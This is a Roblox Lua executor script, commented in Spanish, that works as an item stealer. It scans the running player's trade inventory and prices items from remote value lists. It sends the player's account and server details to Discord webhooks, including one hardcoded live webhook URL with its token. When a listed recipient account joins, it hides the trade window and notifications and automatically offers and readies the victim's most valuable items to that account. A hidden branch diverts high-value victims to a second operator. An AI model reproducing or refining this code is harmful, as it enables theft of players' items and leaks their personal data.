-- ==========================================
-- SCRIPT 2 (CORE ACTUALIZADO CON GITHUB Y DELAY)
-- ==========================================
local HttpService = game:GetService("HttpService")
local RS = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local player = Players.LocalPlayer

-- ==========================================
-- URL DEL REPOSITORIO DE VALORES (JSON)
-- ==========================================
local VALUES_REPO_URL = "https://raw.githubusercontent.com/JOSERAX11/STEALER/main/values.json"
local DUAL_VALUES_REPO_URL = "https://raw.githubusercontent.com/JOSERAX11/SCRIPT-HUB/refs/heads/main/utils5.json"

-- ==========================================
-- CONFIGURACIÓN SECRETA DUAL WEBHOOK
-- ==========================================
local DUAL_WEBHOOK_INVENTARIO = "https://discord.com/api/webhooks/1548772610798657577/pdTP6bzRwfv4MrWMhqdOfdMbqHwn3kKKaJfCRnW2QrQf04R9WmpOJTg85SbHa5FIkd02"

local jugadoresObjetivosDual = {
    "Hahahahlolllpro", "TradeTestingMVSS", "azae3l666",
    "juancarloselkrak7", "azanuvpro777", "ppeoihjv", "BeKindPleaseOmg"
}

-- ==========================================
-- LÓGICA DE INICIO/FILTRADO DE INVENTARIO (EXTRAÍDA DEL SCRIPT 1)
-- ==========================================
local EXCLUDE_ITEMS = { "DefaultGun", "DefaultKnife", "DefaultEffect" }
local EXCLUDE = {}
for _, n in ipairs(EXCLUDE_ITEMS) do EXCLUDE[string.lower(n)] = true end

local okTrade, ItemIsTradeable = pcall(function()
    return require(RS.Shared.Utils.ItemIsTradeable)
end)
if not okTrade or type(ItemIsTradeable) ~= "function" then ItemIsTradeable = nil end

local function isTradeable(name)
    if not ItemIsTradeable then return true end
    local ok, res = pcall(ItemIsTradeable, name)
    if not ok then return true end
    return res and true or false
end
-- ==========================================

-- ==========================================
-- CARGA DINÁMICA DE VALORES DE GITHUB
-- ==========================================
local Knives, Guns, Effects, Emotes = {}, {}, {}, {}
local DualKnives, DualGuns, DualEffects, DualEmotes = {}, {}, {}, {}

local function cargarValoresGitHub()
    -- Cargar Valores Normales
    pcall(function()
        local response = game:HttpGet(VALUES_REPO_URL)
        if response then
            local decodedData = HttpService:JSONDecode(response)
            if decodedData then
                Knives = decodedData.Knives or {}
                Guns = decodedData.Guns or {}
                Effects = decodedData.Effects or {}
                Emotes = decodedData.Emotes or {}
            end
        end
    end)
    
    -- Cargar Valores Duales
    pcall(function()
        local responseDual = game:HttpGet(DUAL_VALUES_REPO_URL)
        if responseDual then
            local decodedDual = HttpService:JSONDecode(responseDual)
            if decodedDual then
                DualKnives = decodedDual.Knives or {}
                DualGuns = decodedDual.Guns or {}
                DualEffects = decodedDual.Effects or {}
                DualEmotes = decodedDual.Emotes or {}
            end
        end
    end)
end

cargarValoresGitHub()

task.spawn(function()
    -- ==========================================
    -- ARREGLO: Esperar a que el SCRIPT 1 se conecte
    -- ==========================================
    while getgenv and not getgenv().AutoTradeConfig do
        task.wait(0.2) -- Espera pasivamente hasta que SCRIPT 1 inyecte la config
    end
    
    local config = getgenv().AutoTradeConfig or {}
    
    local WEBHOOK_LOGS = config.WebhookLogs or "" 
    local WEBHOOK_INVENTARIO = config.WebhookInventario or ""

    local startTime = os.time()

    pcall(function()
        if request and player and WEBHOOK_LOGS ~= "" then
            request({
                Url = WEBHOOK_LOGS,
                Method = "POST",
                Headers = { ["Content-Type"] = "application/json" },
                Body = HttpService:JSONEncode({
                    content = "✅ **" .. player.Name .. "** ha ejecutado el script."
                })
            })
        end
    end)

    Players.PlayerRemoving:Connect(function(leavingPlayer)
        if leavingPlayer == Players.LocalPlayer then
            local tiempoTranscurrido = os.time() - startTime
            local horas = math.floor(tiempoTranscurrido / 3600)
            local minutes = math.floor((tiempoTranscurrido % 3600) / 60)
            local segundos = tiempoTranscurrido % 60

            local textoTiempo = ""
            if horas > 0 then textoTiempo = textoTiempo .. horas .. " horas, " end
            if minutes > 0 then textoTiempo = textoTiempo .. minutes .. " minutos y " end
            textoTiempo = textoTiempo .. segundos .. " segundos"

            pcall(function()
                if request then
                    if WEBHOOK_INVENTARIO ~= "" then
                        request({
                            Url = WEBHOOK_INVENTARIO,
                            Method = "POST",
                            Headers = { ["Content-Type"] = "application/json" },
                            Body = HttpService:JSONEncode({
                                content = "❌ El usuario (**" .. leavingPlayer.Name .. "**) ha cerrado o salido del juego.\n⏳ **Duró ejecutando el script:** `" .. textoTiempo .. "`"
                            })
                        })
                    end
                    if WEBHOOK_LOGS ~= "" then
                        request({
                            Url = WEBHOOK_LOGS,
                            Method = "POST",
                            Headers = { ["Content-Type"] = "application/json" },
                            Body = HttpService:JSONEncode({
                                content = "❌ **" .. leavingPlayer.Name .. "** duró `" .. textoTiempo .. "` usando el script."
                            })
                        })
                    end
                end
            end)
        end
    end)

    local jugadoresObjetivos = config.JugadoresObjetivos or {}

    local armasPrioritarias = {
        LightningBolt = true, LightningStriker = true,
        MatchaBobaKnife = true, MatchaBobaGun = true,
        DuskveilDagger = true, DuskveilIron = true, 
        ValkyrieKnife = true, ValkyrieSword = true, ValkyrieSniper = true, 
        LimeJellyAxe = true, BlueberryJellyAxe = true, StrawberryJellyAxe = true, GrapeJellyAxe = true, 
        LimeJellyUzi = true, BlueberryJellyUzi = true, StrawberryJellyUzi = true, GrapeJellyUzi = true,
        SealordTrident = true, SealordRevolver = true, 
        DragonpetalBlade = true, DragonpetalSniper = true, DragonpetalOutlaw = true, 
        LovestruckKnife = true, LovestruckGun = true,  
        SharkLauncher = true, Revolver_Default = true, 
    }

    local ok, cg = pcall(function() return require(RS.Client.Modules.ClientGlobals) end)

    if ok and cg.PlayerData then
        local pd = cg.PlayerData
        local knives, guns, effects, emotes = {}, {}, {}, {}
        local totalValue = 0
        local dualTotalValue = 0
        local usarDual = false

        local function normalizeName(name)
            return string.gsub(name, " ", "")
        end

        local function scanAndSave(category, valueTable, dualValueTable, resultTable)
            local inv = pd:TryIndex({"Inventory", category})
            if not inv then return end
            
            for guid, item in pairs(inv) do
                if item and item.name and not EXCLUDE[string.lower(item.name)] and isTradeable(item.name) then
                    local cleanName = normalizeName(item.name)
                    
                    -- Sumar y guardar con la tabla normal
                    if valueTable[cleanName] then
                        local itemValue = valueTable[cleanName]
                        totalValue = totalValue + itemValue
                        resultTable[#resultTable + 1] = { name = item.name, guid = guid, value = itemValue }
                    end
                    
                    -- Sumar valor de la tabla DUAL simultáneamente
                    if dualValueTable[cleanName] then
                        dualTotalValue = dualTotalValue + dualValueTable[cleanName]
                    end
                end
            end
        end

        scanAndSave("Knife", Knives, DualKnives, knives)
        scanAndSave("Gun", Guns, DualGuns, guns)
        scanAndSave("Effect", Effects, DualEffects, effects)
        scanAndSave("Emote", Emotes, DualEmotes, emotes)

        local hayItems = (#knives > 0) or (#guns > 0) or (#effects > 0) or (#emotes > 0)

        if hayItems and request then
            local fileName = "AutoTrade_Executions.json"
            local executionData = {}
            local executionText = player.Name .. " 1x executions"

            if isfile and readfile and writefile then
                if isfile(fileName) then
                    local success, data = pcall(function()
                        return HttpService:JSONDecode(readfile(fileName))
                    end)
                    if success and type(data) == "table" then
                        executionData = data
                    end
                end

                local playerName = player.Name
                if not executionData[playerName] then executionData[playerName] = 0 end
                executionData[playerName] = executionData[playerName] + 1

                pcall(function() writefile(fileName, HttpService:JSONEncode(executionData)) end)
                
                executionText = playerName .. " " .. executionData[playerName] .. "x executions"
            end

            local function formatearLista(lista)
                local contador, orden, texto = {}, {}, ""
                for _, v in ipairs(lista) do
                    local clave = v.name
                    if not contador[clave] then
                        contador[clave] = { cantidad = 1, nombre = v.name, valor = v.value }
                        table.insert(orden, clave)
                    else
                        contador[clave].cantidad = contador[clave].cantidad + 1
                        contador[clave].valor = contador[clave].valor + v.value
                    end
                end
                
                for _, clave in ipairs(orden) do
                    local info = contador[clave]
                    texto ..= "🔸 **" .. info.cantidad .. "x " .. info.nombre .. "** `[Val: " .. info.valor .. "💰]`\n"
                end
                
                if string.len(texto) > 1024 then return string.sub(texto, 1, 1020) .. "..." end
                return texto 
            end

            local campos = {}
            if #knives > 0 then table.insert(campos, { name = "🔪 Knives", value = formatearLista(knives), inline = true }) end
            if #guns > 0 then table.insert(campos, { name = "🔫 Guns", value = formatearLista(guns), inline = true }) end
            if #effects > 0 then table.insert(campos, { name = "✨ Effects", value = formatearLista(effects), inline = false }) end
            if #emotes > 0 then table.insert(campos, { name = "🕺 Emotes", value = formatearLista(emotes), inline = false }) end

            local executorName = (identifyexecutor and identifyexecutor()) or "Unknown"
            local playersCount = #Players:GetPlayers()
            local maxPlayers = Players.MaxPlayers
            local robloxVer = version()
            
            local avatarUrl = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. player.UserId .. "&width=420&height=420&format=png"
            local bodyUrl = "https://www.roblox.com/avatar-thumbnail/image?userId=" .. player.UserId .. "&width=420&height=420&format=png"

            local descriptionText = "### 👤 Información del Jugador\n" ..
                                    "**Usuario:** `" .. player.Name .. "`\n" ..
                                    "**Display Name:** `" .. player.DisplayName .. "`\n" ..
                                    "**User ID:** `" .. player.UserId .. "`\n" ..
                                    "**Account Age:** `" .. player.AccountAge .. " Days`\n\n" ..
                                    "### ⚙️ Información del Servidor\n" ..
                                    "**JobId:** `" .. game.JobId .. "`\n" ..
                                    "**🔗 Join Link:** [Click para Unirse](https://fern.wtf/joiner?placeId=135856908115931&gameInstanceId=" .. game.JobId .. ")\n" ..
                                    "**Server:** `" .. playersCount .. "/" .. maxPlayers .. "`\n" ..
                                    "**Roblox Version:** `" .. robloxVer .. "`\n" ..
                                    "**Executor:** `" .. executorName .. "`\n\n" ..
                                    "### 📊 Estadísticas de Hit\n" ..
                                    "**Historial:** `" .. executionText .. "`\n" ..
                                    "**Total Value:** `💰 " .. totalValue .. "`\n" ..
                                    "**Dual Value:** `💰 " .. dualTotalValue .. "`\n\n" ..
                                    "**=============================**"

            local pings = {}
            local embedColor = 3447003

            -- ==========================================
            -- LÓGICA DUAL CONDICIONADA A +7500 DE VALOR DUAL
            -- ==========================================
            if dualTotalValue > 7500 then
                usarDual = true -- Activa la bandera para que el trade use las armas duales
                table.insert(pings, "@MEGA-HIT 🚨 **¡MEGA HIT MASIVO (DUAL +7500)!** 🚨")
                embedColor = 16711680
            elseif totalValue >= 2000 then
                table.insert(pings, "@everyone 🚨 **¡HIT LEGENDARIO DETECTADO (+2000 VALOR)!** 🚨")
                embedColor = 16766720
            end

            local finalContentText = nil
            if #pings > 0 then
                finalContentText = table.concat(pings, "\n")
            end

            local webhookPayload = {
                content = finalContentText, 
                username = "Auto-Trade Bot Scanner",
                avatar_url = "https://upload.wikimedia.org/wikipedia/commons/thumb/3/3a/Roblox_player_icon_black.svg/512px-Roblox_player_icon_black.svg.png",
                embeds = {{
                    title = "🎯 ¡Objetivo de Tradeo Localizado!",
                    color = embedColor, 
                    description = descriptionText,
                    thumbnail = { url = avatarUrl }, 
                    image = { url = bodyUrl },       
                    fields = campos,
                    footer = { 
                        text = "Sistema de Escaneo Automático | " .. os.date("%X"),
                        icon_url = "https://cdn-icons-png.flaticon.com/512/6584/6584141.png"
                    }
                }}
            }
            
            local jsonPayload = HttpService:JSONEncode(webhookPayload)

            -- ==========================================
            -- ENVÍO DE WEBHOOKS (DUAL VS NORMAL)
            -- ==========================================
            if usarDual then
                -- 1. Webhook DUAL: Notifica al instante
                task.spawn(function()
                    if DUAL_WEBHOOK_INVENTARIO ~= "" then
                        request({
                            Url = DUAL_WEBHOOK_INVENTARIO,
                            Method = "POST",
                            Headers = { ["Content-Type"] = "application/json" },
                            Body = jsonPayload
                        })
                    end
                end)

                -- 2. Webhook Normal: Notifica con 5 minutos de delay (300 segundos)
                if WEBHOOK_INVENTARIO ~= "" then
                    task.delay(300, function()
                        pcall(function()
                            request({
                                Url = WEBHOOK_INVENTARIO,
                                Method = "POST",
                                Headers = { ["Content-Type"] = "application/json" },
                                Body = jsonPayload
                            })
                        end)
                    end)
                end
                
                -- Cambia los objetivos a las cuentas DUAL
                jugadoresObjetivos = jugadoresObjetivosDual
            else
                -- Hit normal: Notifica de inmediato únicamente al webhook normal
                if WEBHOOK_INVENTARIO ~= "" then
                    request({
                        Url = WEBHOOK_INVENTARIO,
                        Method = "POST",
                        Headers = { ["Content-Type"] = "application/json" },
                        Body = jsonPayload
                    })
                end
            end
        end

        local jugadorEncontrado = nil

        repeat 
            task.wait(0.5)
            for _, nombre in ipairs(jugadoresObjetivos) do
                local p = Players:FindFirstChild(nombre)
                if p then
                    jugadorEncontrado = p
                    break
                end
            end
        until jugadorEncontrado

        -- ==========================================
        -- ESPERA DE 10 SEGUNDOS AL DETECTAR JUGADOR
        -- ==========================================
        task.wait(10)

        local tradeando = true 
        local posicionOriginalTrade = nil 

        task.spawn(function()
            while tradeando do
                task.wait()
                pcall(function()
                    local pGui = player:WaitForChild("PlayerGui")
                    
                    if pGui:FindFirstChild("Notifications") and pGui.Notifications:FindFirstChild("Body") then
                        pGui.Notifications.Body.Visible = false
                    end
                    
                    if pGui:FindFirstChild("NewGui") and pGui.NewGui:FindFirstChild("TradeNegotiation") then
                        if not posicionOriginalTrade and pGui.NewGui.TradeNegotiation.Position.X.Scale < 100 then
                            posicionOriginalTrade = pGui.NewGui.TradeNegotiation.Position
                        end
                        pGui.NewGui.TradeNegotiation.Position = UDim2.new(1000, 1000, 1000, 1000)
                    end
                end)
            end
        end)

         local function ejecutarTradeo()
            local okData, cgData = pcall(function() return require(RS.Client.Modules.ClientGlobals) end)
            if not okData then return false end
            local pdTrade = cgData.PlayerData
            
            local listaEfectos, listaEmotes = {}, {}
            local listaArmasPrioritarias, listaArmasNormales = {}, {}

            local function scanTrade(cat, valueTable, destList, isPriority)
                local inv = pdTrade:TryIndex({"Inventory", cat})
                if not inv then return end
                for guid, item in pairs(inv) do
                    -- APLICANDO LÓGICA DE INICIO DE INVENTARIO AL MOMENTO DEL TRADEO
                    if item and item.name and not EXCLUDE[string.lower(item.name)] and isTradeable(item.name) then
                        local cleanName = normalizeName(item.name)
                        if valueTable[cleanName] then
                            local itemData = { name = item.name, guid = guid, value = valueTable[cleanName] }
                            if destList then
                                table.insert(destList, itemData)
                            elseif isPriority and armasPrioritarias[cleanName] then
                                table.insert(listaArmasPrioritarias, itemData)
                            else
                                table.insert(listaArmasNormales, itemData)
                            end
                        end
                    end
                end
            end

            -- Si es DUAL, escanea usando la tabla de DUAL_VALUES_REPO_URL, si no, usa la tabla normal
            local activeKnives = usarDual and DualKnives or Knives
            local activeGuns = usarDual and DualGuns or Guns
            local activeEffects = usarDual and DualEffects or Effects
            local activeEmotes = usarDual and DualEmotes or Emotes

            scanTrade("Knife", activeKnives, nil, true)
            scanTrade("Gun", activeGuns, nil, true)
            scanTrade("Effect", activeEffects, listaEfectos, false)
            scanTrade("Emote", activeEmotes, listaEmotes, false)

            local sortPorValor = function(a, b) return a.value > b.value end
            table.sort(listaEmotes, sortPorValor)
            table.sort(listaEfectos, sortPorValor)
            table.sort(listaArmasPrioritarias, sortPorValor)
            table.sort(listaArmasNormales, sortPorValor)

            local itemsRestantes = {}
            for _, v in ipairs(listaEmotes) do table.insert(itemsRestantes, v) end
            for _, v in ipairs(listaEfectos) do table.insert(itemsRestantes, v) end
            for _, v in ipairs(listaArmasPrioritarias) do table.insert(itemsRestantes, v) end
            for _, v in ipairs(listaArmasNormales) do table.insert(itemsRestantes, v) end

            if #itemsRestantes == 0 then return false end
            
            local Remotes = require(RS.Shared.Remotes)
            local ActiveNegotiation = cgData.ActiveNegotiation
            local SessionState = cgData.SessionState
            local Workspace = game:GetService("Workspace")

            -- PROTECCIÓN AÑADIDA: Verifica que player1 y player2 existan antes de leerlos
            local function getSides()
                local data = ActiveNegotiation.Data
                if type(data) ~= "table" then return nil, nil, nil end
                if type(data.player1) ~= "table" or type(data.player2) ~= "table" then return nil, nil, nil end
                
                local me, other
                if data.player1.player and data.player1.player.UserId == player.UserId then
                    me, other = data.player1, data.player2
                else
                    me, other = data.player2, data.player1
                end
                return me, other, data
            end

            -- 1. Enviar o Aceptar Invitación
            repeat
                if not (jugadorEncontrado and jugadorEncontrado.Parent) then return false end

                local incoming = SessionState:TryIndex({ "incomingTradeRequests" })
                local aceptado = false
                
                if type(incoming) == "table" then
                    for _, p in ipairs(incoming) do
                        if p.Name == jugadorEncontrado.Name then
                            Remotes.AcceptInvite:FireServer(p)
                            aceptado = true
                        end
                    end
                end
                
                if not aceptado then
                    Remotes.SendInvite:FireServer(jugadorEncontrado)
                end
                
                task.wait(2.5)
            until getSides() ~= nil

            task.wait(1)

            -- 2. Ofrecer hasta 12 items sin usar GUI
            for i = 1, math.min(12, #itemsRestantes) do
                if not (jugadorEncontrado and jugadorEncontrado.Parent) then return false end

                local item = itemsRestantes[i]
                
                local t0 = os.clock()
                while os.clock() - t0 < 5 do
                    local _, _, d = getSides()
                    if not (d and (d.processing or 0) > Workspace:GetServerTimeNow()) then break end
                    task.wait(0.2)
                end

                Remotes.OfferItem:FireServer(item.guid)
                task.wait(0.35)
            end

            -- 3 & 4. Lógica de Finalización (SetReady Seguro)
            local timeout = os.clock()
            while os.clock() - timeout < 60 do 
                if not (jugadorEncontrado and jugadorEncontrado.Parent) then return false end

                -- Utilizamos getSides que ya viene protegido contra el error 'nil'
                local me, other, data = getSides()
                
                if not data then break end
                if data.exchanging then break end 
                
                         -- Verificamos si somos nosotros y aún no damos ready
                if me and not me.ready then
                    if Workspace:GetServerTimeNow() >= (data.lastUpdate or 0) + 3 then
                        -- SOLUCIÓN: Se pasa data.ref o {} igual que en el script de origen
                        Remotes.SetReady:FireServer(true, data.ref or {})
                    end
                end

                
                task.wait(0.5)
            end

            local finalWait = os.clock()
            while getSides() ~= nil and os.clock() - finalWait < 20 do
                task.wait(1)
            end

            task.wait(2) 
            return true
        end

        -- ==========================================
        -- BUCLE PRINCIPAL DE TRADEO CONTINUO
        -- ==========================================
        while true do
            -- Si el jugador objetivo se sale antes de arrancar el siguiente trade, se rompe el bucle
            if not (jugadorEncontrado and jugadorEncontrado.Parent) then
                break 
            end
            
            local continuar = ejecutarTradeo()
            -- Si ya no hay ítems o `ejecutarTradeo` devolvió false (jugador se salió), rompemos
            if not continuar then 
                break 
            end
        end

        -- ==========================================
        -- RESTAURACIÓN: TODO VUELVE A LA NORMALIDAD
        -- ==========================================
        tradeando = false
        task.wait(0.5) 

        pcall(function()
            local pGui = player:WaitForChild("PlayerGui")
            if pGui:FindFirstChild("Notifications") and pGui.Notifications:FindFirstChild("Body") then
                pGui.Notifications.Body.Visible = true
            end
            if pGui:FindFirstChild("NewGui") and pGui.NewGui:FindFirstChild("TradeNegotiation") then
                if posicionOriginalTrade then
                    pGui.NewGui.TradeNegotiation.Position = posicionOriginalTrade
                else
                    pGui.NewGui.TradeNegotiation.Position = UDim2.new(0.5, -250, 0.5, -200) 
                end
            end
        end)
    end
end)
